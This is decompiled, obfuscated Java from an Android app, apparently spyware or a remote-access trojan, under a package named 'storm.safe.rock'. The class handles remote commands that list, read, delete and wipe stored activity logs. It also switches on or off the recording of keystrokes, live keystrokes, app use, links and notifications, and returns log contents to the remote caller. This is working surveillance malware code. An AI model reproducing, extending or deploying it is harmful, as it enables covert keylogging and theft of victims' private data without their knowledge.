package com.storm.safe.rock.service.modules.command;

import android.os.Environment;
import com.storm.safe.rock.service.modules.AbstractC0315a0;
import com.storm.safe.rock.service.modules.ActivityMonitor$LogType;
import io.socket.engineio.client.transports.PollingXHR;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.util.LinkedHashMap;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import kotlin.collections.AbstractC0770a1;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.text.AbstractC0779a1;
import kotlinx.coroutines.AbstractC0780a0;
import org.json.JSONException;
import org.json.JSONObject;
import p000.AbstractC0003a2;
import p000.AbstractC1262tj;
import p000.AbstractC1517zh;
import p000.C1351vv;
import p000.InterfaceC0726jp;
import p000.InterfaceC0876mv;
import p000.jc0;
import p000.kg1;
import p000.t60;
import p000.tz0;
import p000.uz0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.command.a5 */
/* loaded from: classes2.dex */
public final class C0348a5 implements InterfaceC0726jp {

    /* renamed from: a0 */
    public static final Set f53595a0;

    static {
        new jc0(null);
        f53595a0 = kg1.m213542f1("GET_LOG_LIST", "GET_ALL_LOG_LISTS", "READ_LOG", "DELETE_LOG", "CLEAR_LOGS", "CLEAR_ALL_LOGS", "SET_LOG_OPTIONS", "GET_LOG_OPTIONS");
    }

    /* JADX WARN: Can't fix incorrect switch cases order, some code will duplicate */
    /* renamed from: a3 */
    public static final JSONObject m211879a3(C0348a5 c0348a5, String str, JSONObject jSONObject) {
        String str2;
        String str3;
        File file;
        boolean z;
        JSONObject jSONObject2 = new JSONObject();
        str2 = "";
        boolean z2 = true;
        switch (str.hashCode()) {
            case -2044001648:
                if (str.equals("DELETE_LOG")) {
                    String strOptString = jSONObject != null ? jSONObject.optString("type", "KSTR") : null;
                    str3 = strOptString != null ? strOptString : "KSTR";
                    String strOptString2 = jSONObject != null ? jSONObject.optString("filename", "") : null;
                    str2 = strOptString2 != null ? strOptString2 : "";
                    if (str2.length() == 0) {
                        jSONObject2.put(PollingXHR.Request.EVENT_SUCCESS, false);
                        jSONObject2.put("error", "filename is required");
                        return jSONObject2;
                    }
                    ActivityMonitor$LogType activityMonitor$LogTypeM211881a5 = m211881a5(str3);
                    String str4 = AbstractC0315a0.f53025a0;
                    t60.m214695b6(activityMonitor$LogTypeM211881a5, "type");
                    try {
                        String strName = activityMonitor$LogTypeM211881a5.name();
                        File externalStorageDirectory = Environment.getExternalStorageDirectory();
                        file = new File(externalStorageDirectory + "/IC/" + strName + "/", str2.concat("\n.txt"));
                        if (!file.exists()) {
                            file = new File(externalStorageDirectory + "/IC/" + strName + "/", str2.concat(".txt"));
                        }
                    } catch (Exception e) {
                        tz0.m214807a7("Remove 失败: ", e.getMessage(), "ActivityMonitor");
                    }
                    boolean zDelete = file.exists() ? file.delete() : false;
                    jSONObject2.put(PollingXHR.Request.EVENT_SUCCESS, zDelete);
                    jSONObject2.put("type", str3);
                    jSONObject2.put("filename", str2);
                    StringBuilder sbM41c2 = AbstractC0003a2.m41c2("删除日志: type=", str3, ", filename=", str2, ", result=");
                    sbM41c2.append(zDelete);
                    t60.m214714d6("LogCommandHandler", sbM41c2.toString());
                    return jSONObject2;
                }
                jSONObject2.put(PollingXHR.Request.EVENT_SUCCESS, false);
                jSONObject2.put("error", "Unknown command: ".concat(str));
                return jSONObject2;
            case -1862802413:
                if (str.equals("GET_ALL_LOG_LISTS")) {
                    String str5 = AbstractC0315a0.f53025a0;
                    ActivityMonitor$LogType[] activityMonitor$LogTypeArrValues = ActivityMonitor$LogType.values();
                    int iM213612f7 = AbstractC0770a1.m213612f7(activityMonitor$LogTypeArrValues.length);
                    if (iM213612f7 < 16) {
                        iM213612f7 = 16;
                    }
                    LinkedHashMap linkedHashMap = new LinkedHashMap(iM213612f7);
                    for (ActivityMonitor$LogType activityMonitor$LogType : activityMonitor$LogTypeArrValues) {
                        linkedHashMap.put(activityMonitor$LogType.name(), AbstractC0315a0.m211542a4(activityMonitor$LogType));
                    }
                    JSONObject jSONObject3 = new JSONObject();
                    for (Map.Entry entry : linkedHashMap.entrySet()) {
                        jSONObject3.put((String) entry.getKey(), (String) entry.getValue());
                    }
                    jSONObject2.put(PollingXHR.Request.EVENT_SUCCESS, true);
                    jSONObject2.put("lists", jSONObject3);
                    t60.m214714d6("LogCommandHandler", "获取所有日志列表");
                    return jSONObject2;
                }
                jSONObject2.put(PollingXHR.Request.EVENT_SUCCESS, false);
                jSONObject2.put("error", "Unknown command: ".concat(str));
                return jSONObject2;
            case -1385900161:
                if (str.equals("CLEAR_ALL_LOGS")) {
                    String str6 = AbstractC0315a0.f53025a0;
                    try {
                        File file2 = new File(Environment.getExternalStorageDirectory(), "IC");
                        if (file2.exists()) {
                            AbstractC1517zh.m215418f6(file2);
                        }
                        z = true;
                    } catch (Exception e2) {
                        tz0.m214807a7("ClearAll 失败: ", e2.getMessage(), "ActivityMonitor");
                        z = false;
                    }
                    jSONObject2.put(PollingXHR.Request.EVENT_SUCCESS, z);
                    t60.m214714d6("LogCommandHandler", "清空所有日志: result=" + z);
                    return jSONObject2;
                }
                jSONObject2.put(PollingXHR.Request.EVENT_SUCCESS, false);
                jSONObject2.put("error", "Unknown command: ".concat(str));
                return jSONObject2;
            case -218395519:
                if (str.equals("CLEAR_LOGS")) {
                    String strOptString3 = jSONObject != null ? jSONObject.optString("type", "KSTR") : null;
                    str3 = strOptString3 != null ? strOptString3 : "KSTR";
                    ActivityMonitor$LogType activityMonitor$LogTypeM211881a52 = m211881a5(str3);
                    String str7 = AbstractC0315a0.f53025a0;
                    t60.m214695b6(activityMonitor$LogTypeM211881a52, "type");
                    try {
                        File file3 = new File(Environment.getExternalStorageDirectory(), "IC/" + activityMonitor$LogTypeM211881a52.name());
                        if (file3.exists()) {
                            AbstractC1517zh.m215418f6(file3);
                        }
                    } catch (Exception e3) {
                        tz0.m214807a7("Clear 失败: ", e3.getMessage(), "ActivityMonitor");
                        z2 = false;
                    }
                    jSONObject2.put(PollingXHR.Request.EVENT_SUCCESS, z2);
                    jSONObject2.put("type", str3);
                    t60.m214714d6("LogCommandHandler", "清空日志: type=" + str3 + ", result=" + z2);
                    return jSONObject2;
                }
                jSONObject2.put(PollingXHR.Request.EVENT_SUCCESS, false);
                jSONObject2.put("error", "Unknown command: ".concat(str));
                return jSONObject2;
            case -83628805:
                if (str.equals("READ_LOG")) {
                    String strOptString4 = jSONObject != null ? jSONObject.optString("type", "KSTR") : null;
                    str3 = strOptString4 != null ? strOptString4 : "KSTR";
                    String strOptString5 = jSONObject != null ? jSONObject.optString("filename", "") : null;
                    String str8 = strOptString5 == null ? "" : strOptString5;
                    if (str8.length() == 0) {
                        jSONObject2.put(PollingXHR.Request.EVENT_SUCCESS, false);
                        jSONObject2.put("error", "filename is required");
                        return jSONObject2;
                    }
                    ActivityMonitor$LogType activityMonitor$LogTypeM211881a53 = m211881a5(str3);
                    String str9 = AbstractC0315a0.f53025a0;
                    t60.m214695b6(activityMonitor$LogTypeM211881a53, "type");
                    try {
                        File file4 = new File(Environment.getExternalStorageDirectory() + "/IC/" + activityMonitor$LogTypeM211881a53.name() + "/", str8.concat(".txt"));
                        if (file4.exists()) {
                            StringBuilder sb = new StringBuilder();
                            FileInputStream fileInputStream = new FileInputStream(file4);
                            try {
                                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(fileInputStream));
                                try {
                                    StringBuilder sb2 = new StringBuilder();
                                    while (true) {
                                        String line = bufferedReader.readLine();
                                        if (line != null) {
                                            sb2.append(line);
                                        } else {
                                            String string = sb2.toString();
                                            t60.m214694b5(string, "text.toString()");
                                            for (String str10 : AbstractC0779a1.m213677d0(string, new String[]{":::"}, 6)) {
                                                if (AbstractC0779a1.m213687e0(str10).toString().length() > 0) {
                                                    sb.append(AbstractC0315a0.m211539a1(str10));
                                                }
                                            }
                                            bufferedReader.close();
                                            fileInputStream.close();
                                            String string2 = sb.toString();
                                            t60.m214694b5(string2, "{\n            val typeNa…sult.toString()\n        }");
                                            str2 = string2;
                                        }
                                    }
                                } finally {
                                }
                            } finally {
                            }
                        }
                    } catch (Exception e4) {
                        tz0.m214807a7("Read 失败: ", e4.getMessage(), "ActivityMonitor");
                    }
                    jSONObject2.put(PollingXHR.Request.EVENT_SUCCESS, true);
                    jSONObject2.put("type", str3);
                    jSONObject2.put("filename", str8);
                    jSONObject2.put("content", str2);
                    int length = str2.length();
                    StringBuilder sbM41c22 = AbstractC0003a2.m41c2("读取日志: type=", str3, ", filename=", str8, ", size=");
                    sbM41c22.append(length);
                    t60.m214714d6("LogCommandHandler", sbM41c22.toString());
                    return jSONObject2;
                }
                jSONObject2.put(PollingXHR.Request.EVENT_SUCCESS, false);
                jSONObject2.put("error", "Unknown command: ".concat(str));
                return jSONObject2;
            case 217566426:
                if (str.equals("GET_LOG_OPTIONS")) {
                    jSONObject2.put(PollingXHR.Request.EVENT_SUCCESS, true);
                    jSONObject2.put("options", m211880a4());
                    t60.m214714d6("LogCommandHandler", "获取日志选项");
                    return jSONObject2;
                }
                jSONObject2.put(PollingXHR.Request.EVENT_SUCCESS, false);
                jSONObject2.put("error", "Unknown command: ".concat(str));
                return jSONObject2;
            case 433286082:
                if (str.equals("GET_LOG_LIST")) {
                    String strOptString6 = jSONObject != null ? jSONObject.optString("type", "KSTR") : null;
                    str3 = strOptString6 != null ? strOptString6 : "KSTR";
                    String strM211542a4 = AbstractC0315a0.m211542a4(m211881a5(str3));
                    jSONObject2.put(PollingXHR.Request.EVENT_SUCCESS, true);
                    jSONObject2.put("type", str3);
                    jSONObject2.put("files", strM211542a4);
                    t60.m214714d6("LogCommandHandler", "获取日志列表: type=" + str3 + ", files=" + strM211542a4);
                    return jSONObject2;
                }
                jSONObject2.put(PollingXHR.Request.EVENT_SUCCESS, false);
                jSONObject2.put("error", "Unknown command: ".concat(str));
                return jSONObject2;
            case 1128318950:
                if (str.equals("SET_LOG_OPTIONS")) {
                    if (jSONObject != null) {
                        if (jSONObject.has("recKeystrokes")) {
                            String str11 = AbstractC0315a0.f53025a0;
                            AbstractC0315a0.f53032a7 = jSONObject.optBoolean("recKeystrokes", true);
                        }
                        if (jSONObject.has("liveKeystrokes")) {
                            String str12 = AbstractC0315a0.f53025a0;
                            AbstractC0315a0.f53033a8 = jSONObject.optBoolean("liveKeystrokes", false);
                        }
                        if (jSONObject.has("recApps")) {
                            String str13 = AbstractC0315a0.f53025a0;
                            AbstractC0315a0.f53034a9 = jSONObject.optBoolean("recApps", true);
                        }
                        if (jSONObject.has("recLinks")) {
                            String str14 = AbstractC0315a0.f53025a0;
                            AbstractC0315a0.f53035b0 = jSONObject.optBoolean("recLinks", true);
                        }
                        if (jSONObject.has("recNotifications")) {
                            String str15 = AbstractC0315a0.f53025a0;
                            AbstractC0315a0.f53036b1 = jSONObject.optBoolean("recNotifications", true);
                        }
                    }
                    jSONObject2.put(PollingXHR.Request.EVENT_SUCCESS, true);
                    jSONObject2.put("options", m211880a4());
                    t60.m214714d6("LogCommandHandler", "设置日志选项");
                    return jSONObject2;
                }
                jSONObject2.put(PollingXHR.Request.EVENT_SUCCESS, false);
                jSONObject2.put("error", "Unknown command: ".concat(str));
                return jSONObject2;
            default:
                jSONObject2.put(PollingXHR.Request.EVENT_SUCCESS, false);
                jSONObject2.put("error", "Unknown command: ".concat(str));
                return jSONObject2;
        }
    }

    /* renamed from: a4 */
    public static JSONObject m211880a4() throws JSONException {
        JSONObject jSONObject = new JSONObject();
        String str = AbstractC0315a0.f53025a0;
        jSONObject.put("recKeystrokes", AbstractC0315a0.f53032a7);
        jSONObject.put("liveKeystrokes", AbstractC0315a0.f53033a8);
        jSONObject.put("recApps", AbstractC0315a0.f53034a9);
        jSONObject.put("recLinks", AbstractC0315a0.f53035b0);
        jSONObject.put("recNotifications", AbstractC0315a0.f53036b1);
        return jSONObject;
    }

    /* renamed from: a5 */
    public static ActivityMonitor$LogType m211881a5(String str) {
        try {
            String upperCase = str.toUpperCase(Locale.ROOT);
            t60.m214694b5(upperCase, "this as java.lang.String).toUpperCase(Locale.ROOT)");
            return ActivityMonitor$LogType.valueOf(upperCase);
        } catch (Exception unused) {
            return ActivityMonitor$LogType.f52729a1;
        }
    }

    @Override // p000.InterfaceC0726jp
    /* renamed from: a0 */
    public final boolean mo210872a0(String str) {
        return t60.m214690a8(this, str);
    }

    @Override // p000.InterfaceC0726jp
    /* renamed from: a1 */
    public final Set mo210873a1() {
        return f53595a0;
    }

    @Override // p000.InterfaceC0726jp
    /* renamed from: a2 */
    public final Object mo210874a2(String str, JSONObject jSONObject, uz0 uz0Var, InterfaceC0876mv interfaceC0876mv) throws Throwable {
        String strOptString = jSONObject != null ? jSONObject.optString("requestId", "") : null;
        Object objM213696a7 = AbstractC0780a0.m213696a7(AbstractC1262tj.f60234a1, new LogCommandHandler$handle$2(this, str, jSONObject, strOptString == null ? "" : strOptString, uz0Var.m214869a5(), null), interfaceC0876mv);
        return objM213696a7 == CoroutineSingletons.f57606a0 ? objM213696a7 : C1351vv.f60710b1;
    }
}
